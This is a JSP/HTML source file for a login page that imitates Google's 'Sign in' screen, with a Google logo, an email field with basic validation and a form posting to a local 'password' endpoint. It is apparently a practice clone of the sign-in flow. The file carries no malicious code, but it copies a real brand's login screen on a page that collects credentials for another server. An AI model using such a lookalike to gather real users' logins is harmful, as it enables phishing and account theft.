<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<style type="text/css">
body {
	background-color: #FF8A65
}

h2, h3 {
	font-family: Serif;
}

a {
	margin-top: 10px;
}

img {
	border-width: 10px;
}

img:hover {
	background-color: black;
	color: white;
}

input[type] {
	margin-top: 10px;
	width: 350px;
	padding: 8px;
	box-sizing: border-box;
	background: transparent;
	border-width: 0px;
	border: none;
	border-bottom: 2px solid blue;
}

button {
	 cursor: pointer;
	margin-top: 10px;
	margin-left: 300px;
	color: white;
	background-color: #03A9F4;
	padding: 10px;
	border-radius: 6px;
	box-sizing: border-box;
}

button:hover {
	background-color: #3F51B5;
}

.flex-container {

	display: -webkit-flex;
	display: flex;
	-webkit-flex-direction: column;
	flex-direction: column;
	 border-top-left-radius: 2em;
	  border-top-right-radius: 2em;
	  border-bottom-left-radius: 2em;
	  border-bottom-right-radius: 2em;
	width: 500px;
	height: 600px;
	margin-top: 6%;
	margin-left: 29%;
	background-color: #FBE9E7;
	  box-shadow: 10px 10px 5px grey;
}

.flex-item {
	background-color: #FBE9E7;
	flex-direction: column;
	margin-top: 5px;
	margin-left: 50px;
}

#text {
	margin-top: 10px;
	color: #2196F3;
}

#spaces {
	margin-top: 120px;
}
p {
color: red;
}
</style>
<title>Sign in-Google Account</title>
</head>

<script type="text/javascript">
function validateForm() {
	
	var email=document.form.email.value;
	if(email=="") {
		
		document.getElementById("emailV").innerHTML="This is required";
		return false;
	}
	if(validateEmail()) {
		
		document.getElementById("emailV").innerHTML="Email should be in __@gmail.com format";
		return false;
	}
		
		
		
		
	return true;
}
function validateEmail() {
	var email = document.form.email.value;
	var specialCharacter = email.indexOf("@");
	var dotSymbol = email.indexOf(".");
	if (specialCharacter < 1 || (dotSymbol - specialCharacter < 5))
		return true;
	return false;

}
</script>
<body>
	<div class="flex-container">
		<form action="password" method="post" name="form" onSubmit="return validateForm()">

			<div id="spaces">
				<div class="flex-item" id="google">
					<img src="googleImg.png" height="30" alt="Google" class="image" />
				</div>
				<div class="flex-item" id="signin">
					<h2>Sign in</h2>
					<span><h3>with your Google Account</h3></span>
				</div>
				<div class="flex-item" id="signin">
					<input type="text" name="email" placeholder="Email"
						 />
						 <p id="emailV"></p>
				</div>
				<div class="flex-item">
					<a href="#"><label id="text">Forgot email?</label></a>
				</div>
				<div class="flex-item">
					<button type="submit">NEXT</button>
				</div>
				<div class="flex-item">
					<label id="text" style="">Other Options</label> <a href="register">Register</a>
				</div>
			</div>
		</form>
	</div>

</body>
</html>